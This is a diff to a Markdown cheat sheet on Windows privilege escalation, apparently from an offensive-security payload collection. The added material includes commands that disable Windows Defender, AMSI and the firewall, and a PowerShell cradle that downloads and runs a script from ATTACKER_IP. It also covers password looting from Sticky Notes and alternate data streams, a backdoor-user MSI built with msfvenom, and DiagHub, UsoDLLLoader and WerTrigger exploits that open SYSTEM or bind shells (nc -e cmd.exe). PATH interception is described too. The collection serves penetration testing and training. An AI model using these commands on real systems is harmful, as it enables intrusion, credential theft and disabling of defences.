@@ -8,6 +8,7 @@
 * [Network Enumeration](#network-enumeration)
 * [Antivirus & Detections](#antivirus--detections)
     * [Windows Defender](#windows-defender)
+    * [Firewall](#firewall)
     * [AppLocker Enumeration](#applocker-enumeration)
     * [Powershell](#powershell)
     * [Default Writeable Folders](#default-writeable-folders)
@@ -18,8 +19,11 @@
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
     * [Passwords in unattend.xml](#passwords-in-unattendxml)
     * [Wifi passwords](#wifi-passwords)
+    * [Sticky Notes passwords](#sticky-notes-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
-    * [Powershell history](#powershell-history)
+    * [Powershell History](#powershell-history)
+    * [Powershell Transcript](#powershell-transcript)
+    * [Password in Alternate Data Stream](#password-in-alternate-data-stream)
 * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
@@ -38,6 +42,10 @@
   * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
   * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
   * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
+* [EoP - Privileged File Write](#eop---privileged-file-write)
+    * [DiagHub](#diaghub)
+    * [UsoDLLLoader](#usodllloader)
+    * [WerTrigger](#wertrigger)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
   * [MS08-067 (NetAPI)](#ms08-067-netapi)
   * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
@@ -46,6 +54,7 @@
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
   * [CVE-2019-1388](#cve-2019-1388)
+* [EoP - $PATH Interception](#eop---path-interception)
 * [References](#references)
 
 ## Tools
@@ -78,6 +87,23 @@
 - [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+    ```
+- [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
+- [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
+    ```powershell
+    # First obtain systeminfo
+    systeminfo
+    systeminfo > systeminfo.txt
+    # Then feed it to wesng
+    python3 wes.py --update-wes
+    python3 wes.py --update
+    python3 wes.py systeminfo.txt
+    ```
+- [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
+    ```powershell
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
     ```
 
 ## Windows Version and Configuration
@@ -166,6 +192,14 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 ```
 
+Get Domain Controllers
+
+```powershell
+nltest /DCLIST:DomainName
+nltest /DCNAME:DomainName
+nltest /DSGETDC:DomainName
+```
+
 ## Network Enumeration
 
 List all network interfaces, IP, and DNS.
@@ -196,13 +230,53 @@ List all current connections
 netstat -ano
 ```
 
+List all network shares
+
+```powershell
+net share
+powershell Find-DomainShare -ComputerDomain domain.local
+```
+
+SNMP Configuration
+
+```powershell
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+```
+
+## Antivirus & Detections
+
+Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+
+### Windows Defender
+
+```powershell
+# check status of Defender
+PS C:\> Get-MpComputerStatus
+
+# disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+
+# disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
+# exclude a folder
+PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
+PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
+PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
+
+# remove signatures (if Internet connection is present, they will be downloaded again):
+PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+```
+
+### Firewall
+
 List firewall state and current configuration
 
 ```powershell
 netsh advfirewall firewall dump
-
-or 
-
+# or 
 netsh firewall show state
 netsh firewall show config
 ```
@@ -216,46 +290,33 @@ $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"}
 Disable firewall
 
 ```powershell
+# Disable Firewall on Windows 7 via cmd
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Disable Firewall on Windows 7 via Powershell
+powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
+
+# Disable Firewall on any windows via cmd
 netsh firewall set opmode disable
-netsh advfirewall set allprofiles state off
+netsh Advfirewall set allprofiles state off
 ```
 
-List all network shares
-
-```powershell
-net share
-```
-
-SNMP Configuration
-
-```powershell
-reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
-Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
-```
-
-## Antivirus & Detections
-
-### Windows Defender
-
-```powershell
-# check status of Defender
-PS C:\> Get-MpComputerStatus
-
-# disable Real Time Monitoring
-PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
-```
 
 ### AppLocker Enumeration
 
 - With the GPO
 - HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
 
-List AppLocker rules
 
-```powershell
-PS C:\> $a = Get-ApplockerPolicy -effective
-PS C:\> $a.rulecollections
-```
+* List AppLocker rules
+    ```powershell
+    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+    ```
+
+* Applocker Bypass
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md
 
 ### Powershell
 
@@ -265,6 +326,22 @@ Default powershell locations in a Windows system.
 C:\windows\syswow64\windowspowershell\v1.0\powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell
 ```
+
+Powershell Constrained Mode
+
+```powershell
+# Check if we are in a constrained mode
+$ExecutionContext.SessionState.LanguageMode
+
+PS > &{ whoami }
+powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+
+# PowerShDLL - Powershell with no Powershell.exe via DLL’s
+# https://github.com/p3nt4/PowerShdll
+ftp> rundll32.exe C:\temp\PowerShdll.dll,main
+```
+
+
 
 Example of AMSI Bypass.
 
@@ -279,7 +356,9 @@ PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetF
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
-C:\windows\tracing
+C:\Windows\tracing
+C:\Windows\Temp
+C:\Users\Public
 ```
 
 ## EoP - Looting for passwords
@@ -420,6 +499,8 @@ C:\inetpub\wwwroot\web.config
 %USERPROFILE%\ntuser.dat
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 %WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
 dir c:*vnc.ini /s /b
 dir c:*ultravnc.ini /s /b
 ```
@@ -442,6 +523,10 @@ Oneliner method to extract wifi passwords from all the access point.
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 ```
 
+### Sticky Notes passwords
+
+The sticky notes app stores it's content in a sqlite db located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
+
 ### Passwords stored in services
 
 Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
@@ -454,7 +539,7 @@ Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
-### Powershell history
+### Powershell History
 
 ```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -464,64 +549,71 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
+### Powershell Transcript
+
+```xml
+C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
+C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
+```
+
+### Password in Alternate Data Stream
+
+```ps1
+PS > Get-Item -path flag.txt -Stream *
+PS > Get-Content -path flag.txt -Stream Flag
+```
+
 ## EoP - Processes Enumeration and Tasks
 
-What processes are running?
+* What processes are running?
+    ```powershell
+    tasklist /v
+    net start
+    sc query
+    Get-Service
+    Get-Process
+    Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+    ```
 
-```powershell
-tasklist /v
-net start
-sc query
-Get-Service
-Get-Process
-Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
-```
+* Which processes are running as "system"
+    ```powershell
+    tasklist /v /fi "username eq system"
+    ```
 
-Which processes are running as "system"
+* Do you have powershell magic?
+    ```powershell
+    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
+    ```
 
-```powershell
-tasklist /v /fi "username eq system"
-```
+* List installed programs
+    ```powershell
+    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+    ```
 
-Do you have powershell magic?
+* List services
+    ```powershell
+    net start
+    wmic service list brief
+    tasklist /SVC
+    ```
 
-```powershell
-REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
-```
+* Enumerate scheduled tasks
+    ```powershell
+    schtasks /query /fo LIST 2>nul | findstr TaskName
+    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+    ```
 
-List installed programs
-
-```powershell
-Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
-Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
-```
-
-List services
-
-```powershell
-net start
-wmic service list brief
-tasklist /SVC
-```
-
-Scheduled tasks
-
-```powershell
-schtasks /query /fo LIST 2>nul | findstr TaskName
-schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
-Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
-```
-
-Startup tasks
-
-```powershell
-wmic startup get caption,command
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
-dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
-dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
-```
+* Startup tasks
+    ```powershell
+    wmic startup get caption,command
+    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+    dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+    dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+    ```
 
 ## EoP - Incorrect permissions in services
 
@@ -551,17 +643,16 @@ Often, services are pointing to writeable locations:
     ```
 
 - PATH directories with weak permissions
+    ```powershell
+    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
 
-```powershell
-$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
-$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
-
-$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
-FOR /F %i in (Servicenames.txt) DO echo %i
-type Servicenames.txt
-FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
-FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
-```
+    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+    FOR /F %i in (Servicenames.txt) DO echo %i
+    type Servicenames.txt
+    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+    ```
 
 Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`
 
@@ -679,7 +770,6 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 * Metasploit exploit : `exploit/windows/local/trusted_service_path`
 * PowerUp exploit
-
     ```powershell
     # find the vulnerable application
     C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
@@ -742,19 +832,26 @@ Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
 
 Check if these registry values are set to "1".
 
-```bat
+```powershell
 $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 $ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
 Then create an MSI package and install it.
 
 ```powershell
 $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 $ msiexec /quiet /qn /i C:\evil.msi
 ```
 
-Technique also available in Metasploit : `exploit/windows/local/always_install_elevated`
+Technique also available in :
+* Metasploit : `exploit/windows/local/always_install_elevated`
+* PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
+
 
 ## EoP - Insecure GUI apps
 
@@ -811,6 +908,7 @@ Then you can use `runas` with the `/savecred` options in order to use the saved 
 The following example is calling a remote binary via an SMB share.
 ```powershell
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+runas /savecred /user:Administrator "cmd.exe /k whoami"
 ```
 
 Using `runas` with a provided set of credential.
@@ -979,6 +1077,59 @@ Binary available at : https://github.com/ohpe/juicy-potato/releases
         [+] CreateProcessWithTokenW OK
     ```
 
+
+## EoP - Privileged File Write
+
+### DiagHub
+
+:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.
+
+The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. 
+This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the `C:\Windows\System32` directory. 
+
+#### Exploit
+
+1. Create an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\Windows\System32`
+2. Build https://github.com/xct/diaghub
+3. `diaghub.exe c:\\ProgramData\\ payload.dll`
+
+The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`
+
+Alternative tools:
+* https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag
+* https://github.com/decoder-it/diaghub_exploit
+
+
+### UsoDLLLoader
+
+:warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.
+
+> An alternative to the DiagHub DLL loading "exploit" found by James Forshaw (a.k.a. @tiraniddo)
+
+If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of `windowscoredeviceinfo.dll` into `C:\Windows\Sytem32\` and then have it loaded by the USO service to get arbitrary code execution as **NT AUTHORITY\System**.
+
+#### Exploit
+
+1. Build https://github.com/itm4n/UsoDllLoader
+    * Select Release config and x64 architecure.
+    * Build solution.
+        * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
+        * Loader .\x64\Release\UsoDllLoader.exe.
+2. Copy `WindowsCoreDeviceInfo.dll` to `C:\Windows\System32\`
+3. Use the loader and wait for the shell or run `usoclient StartInteractiveScan` and connect to the bind shell on port 1337.
+
+
+### WerTrigger
+
+> Weaponizing for privileged file writes bugs with Windows problem reporting
+
+1. Clone https://github.com/sailay1996/WerTrigger
+2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
+3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
+4. Then, run `WerTrigger.exe`.
+5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
+
+
 ## EoP - Common Vulnerabilities and Exposure
 
 ### MS08-067 (NetAPI)
@@ -1092,7 +1243,7 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 
 Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
 
-Working on :
+Requirement:
 - Windows 7 
 - Windows 10 LTSC 10240
 
@@ -1102,6 +1253,29 @@ Failing on :
 - 1803
 
 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
+
+
+## EoP - $PATH Interception
+
+Requirements:
+- PATH contains a writeable folder with low privileges.
+- The writeable folder is _before_ the folder that contains the legitimate binary.
+
+EXAMPLE:
+```
+//(Powershell) List contents of the PATH environment variable
+//EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
+$env:Path
+
+//See permissions of the target folder
+//EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
+icacls.exe "C:\Program Files\nodejs\"
+
+//Place our evil-file in that folder.
+copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
+```
+
+Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. 
 
 ## References
 
@@ -1134,3 +1308,7 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
 * [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
+* [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
+* [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
+* [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
+* [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
